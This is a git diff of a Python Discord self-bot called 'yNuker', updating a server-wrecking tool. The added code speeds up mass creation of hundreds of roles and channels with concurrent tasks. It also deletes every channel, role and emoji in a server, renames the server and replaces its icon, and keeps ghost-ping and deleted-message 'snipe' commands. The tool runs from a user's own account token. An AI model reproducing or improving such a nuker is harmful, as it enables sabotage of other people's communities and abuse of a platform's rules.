@@ -18,7 +18,7 @@ LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE."""
 
-
+import asyncio
 import discord
 from discord.embeds import Embed
 from discord.ext import commands
@@ -57,25 +57,14 @@ def banner():
     sys.stdout.buffer.write(f'''\
 {Fore.LIGHTRED_EX}
                                 ██╗   ██╗███╗  ██╗██╗   ██╗██╗  ██╗███████╗██████╗
-                                ╚██╗ ██╔╝████╗ ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗   Version: {VERSION}
-                                 ╚████╔╝ ██╔██╗██║██║   ██║█████═╝ █████╗  ██████╔╝      Made by: YeetDisDude#0001
+                                ╚██╗ ██╔╝████╗ ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗   Version: {Fore.WHITE}{VERSION}{Fore.LIGHTRED_EX}
+                                 ╚████╔╝ ██╔██╗██║██║   ██║█████═╝ █████╗  ██████╔╝      Made by: {Fore.WHITE}YeetDisDude#0001{Fore.LIGHTRED_EX}
                                   ╚██╔╝  ██║╚████║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
                                    ██║   ██║ ╚███║╚██████╔╝██║ ╚██╗███████╗██║  ██║
                                    ╚═╝   ╚═╝  ╚══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     
 '''.encode('utf8'))
 
-def cmds():
-    sys.stdout.buffer.write(f'''\
-{Fore.LIGHTRED_EX}
-                                                                                    {Fore.LIGHTRED_EX}Commands
-                                       {prefix}kickAll  |   {prefix}delAll  | {prefix}createCh
-                                      {prefix}nameAll   |  {prefix}everyone | {prefix}createVc
-                                        
-                                   ==================Others=================
-                                   
-                                       {prefix}ping     |   {prefix}snipe   | {prefix}ghostping
                                        
-'''.encode('utf8'))
 
 #json shit
 token = config["token"] 
@@ -85,10 +74,12 @@ chName = config["chName"]
 roleName = config["roleName"]
 vcName = config["vcName"]
 ghostpingmsg = config["ghostpingmsg"]
-nick = config["nickname"]
 catName = config["catName"]
+serverName = config["serverName"]
 
-selected_server = None
+#non json config
+icon = requests.get("https://cdn.discordapp.com/emojis/914075850998173706.png?size=160").content
+
 
 clear()
 print(loading)
@@ -100,19 +91,19 @@ client = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=Tru
 async def on_ready():
     print("                                                      Finished loading.")
     time.sleep(1)
-    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="absolutely nothing"))
     clear()
     banner()
     print(f'                                                {Fore.RED}yNuker ready.')
     print(f'                                 {Fore.LIGHTRED_EX}Hello, {Fore.LIGHTWHITE_EX}{client.user.name}#{client.user.discriminator}! {Fore.LIGHTRED_EX}| {Fore.LIGHTWHITE_EX}{client.user.id}')
-    print(f'                                        {Fore.LIGHTRED_EX}You are curently in {Fore.RED}{len(client.guilds)} {Fore.LIGHTRED_EX}servers.')
+    print(f'                                        {Fore.LIGHTRED_EX}You are curently in {Fore.WHITE}{len(client.guilds)} {Fore.LIGHTRED_EX}servers.')
     print(f'''
                 
-                                                {Fore.LIGHTRED_EX}Commands
+                                                     {Fore.LIGHTRED_EX}Commands
                                        {prefix}createAll  |   {prefix}delAll  |  {prefix}createCat
-                                      {prefix}createRole  |  {prefix}createVc |
+                                      {prefix}createRole  |  {prefix}createVc | {prefix}guildEdit
+                                                       {Fore.RED}{prefix}nuke
                                         
-                                   ==================Others=================
+                                   {Fore.LIGHTRED_EX}==================Others=================
                                    
                                        {prefix}ping     |   {prefix}snipe   | {prefix}ghostping
                                        {prefix}bitcoin  |   {prefix}
@@ -120,81 +111,79 @@ async def on_ready():
                                    ''')                                
 cmds = ''
 
-@client.event
+@client.event #ignore command not found error
 async def on_command_error(ctx, error):
     if isinstance(error, CommandNotFound):
         return
     raise error
 
-
-colors = ['0x32a852', '0x4ac7b8', '0x4a69c7', '0x804ac7', '0xc14ac7', '0xc74a63', '0x8dc74a', '0xc7b64a', '0xd43737'] #nothing
-
-
 @client.command()
-async def createCh(ctx):
+async def guildEdit(ctx):
     await ctx.message.delete()
-    for i in range(400):
-        guild = ctx.guild
-        print(f"Creating channels. {chName}")
-        await ctx.guild.create_text_channel(f"{chName}")
+    await ctx.guild.edit(name=f"{serverName}")
+    await ctx.guild.edit(icon=icon)
+
 
 @client.command()
 async def createCat(ctx):
     await ctx.message.delete()
+    print(f"- Creating categories. {catName}")
     for i in range(400):
         guild = ctx.guild
-        print(f"- Creating categories. {catName}")
         await ctx.guild.create_category(f"{catName}")
         print("Success.")
 
 @client.command()
 async def createVc(ctx):
     await ctx.message.delete()
+    print(f"- Creating voice channels. {vcName}")
     for i in range(400):
         guild = ctx.guild
-        print(f"- Creating voice channels. {vcName}")
         await ctx.guild.create_text_channel(f"{vcName}")
         print("Success.")
 
+
+async def roles(guild):
+  print(f"- Creating roles. {roleName}")
+  for x in range(250):
+    await guild.create_role(name=f"{roleName}")
+
+async def channels(guild):
+  print(f"- Creating channels. {chName}")
+  for x in range(500):
+    await guild.create_text_channel(f"{chName}")
+
 @client.command()
 async def createAll(ctx):
-    await ctx.message.delete()
-    for i in range(100):
-        guild = ctx.guild
-        print("Creating voice channels, text channels, and categories.")
-        await ctx.guild.create_text_channel(f"{vcName}")
-        await ctx.guild.create_text_channel(f"{vcName}")
-        await ctx.guild.create_category(f"{catName}")
-        print("Success.")
+    tasks = [roles(ctx.guild), channels (ctx.guild)]
+    await asyncio.gather(*tasks)
 
 
 @client.command()
 async def delAll(ctx):
     await ctx.message.delete()
-    print(' Deleting everything...')
-    
-    print('- Deleting channels..')
-    for channel in ctx.guild.channels:
-        try:
-            await channel.delete()
-        except discord.HTTPException:
-            print(f"I wasen't able to delete the channel {channel.name} in the server {ctx.guild.name}")    
+
+    print('- Deleting channels')
+    try:
+      tasks = [x.delete() for x in ctx.guild.channels]
+      await asyncio.gather(*tasks)   
+    except:
+      pass
+
     print('- Deleting roles..')
-    for role in ctx.guild.roles:
+    try:
+      tasks = [x.delete() for x in ctx.guild.roles]
+      await asyncio.gather(*tasks)
+    except:
+      pass
 
-        if str(role) == '@everyone':
-            continue
+    print('- Deleting emojis')
+    try:
+      tasks = [x.delete() for x in ctx.guild.emojis]
+      await asyncio.gather(*tasks)
+    except:
+      pass
 
-        try:
-            await role.delete()
-        except discord.Forbidden:
-            print(f"[{ctx.guild.name}] - I'm not able to delete the role {role.name} in")
-    print('- Deleting emojis..')
-    for emoji in ctx.guild.emojis:
-        try:
-            await emoji.delete()
-        except discord.Forbidden:
-            print(f"[{ctx.guild.name}] - I am not able to delete the role {emoji.name}.")
     print("I have deleted everything.")
 
 #======================================================others section=================================
@@ -208,28 +197,32 @@ async def ping(ctx):
     await ctx.send(embed=embed)
 
 #snipe command
-client.sniped_messages = {}
-
-
+snipe_message_content = None
+snipe_message_author = None
 
 @client.event
 async def on_message_delete(message):
-    client.sniped_messages[message.guild.id] = (message.content, message.author, message.channel.name, message.created_at)
+    global snipe_message_content
+    global snipe_message_author
+
+
+    snipe_message_content = message.content
+    snipe_message_author = message.author.name 
+    await asyncio.sleep(60)  
+    snipe_message_author = None 
+    snipe_message_content = None
 
 @client.command()
-async def snipe(ctx):
-    try:
-        contents, author, channel_name, time = client.sniped_messages[ctx.guild.id]
+async def snipe(message):
+    if snipe_message_content==None:
         
-    except:
-        await ctx.channel.send("I couldn't find a message to snipe.")
+        await message.channel.send("I can't find anything to snipe.")
+    else:
+        embed = discord.Embed(description=f"{snipe_message_content}")
+        embed.set_footer(text=f"{prefix}snipe sent by {message.author.name}#{message.author.discriminator}")
+        embed.set_author(name = f"Message by {snipe_message_author} sniped.")
+        await message.channel.send(embed=embed)
         return
-
-    embed = discord.Embed(description=contents, color=discord.Color.purple(), timestamp=time)
-    embed.set_author(name=f"{author.name}#{author.discriminator}", icon_url=author.avatar_url)
-    embed.set_footer(text=f"Deleted in : #{channel_name}")
-
-    await ctx.channel.send(embed=embed)
 #snipe command
 
 @client.command()
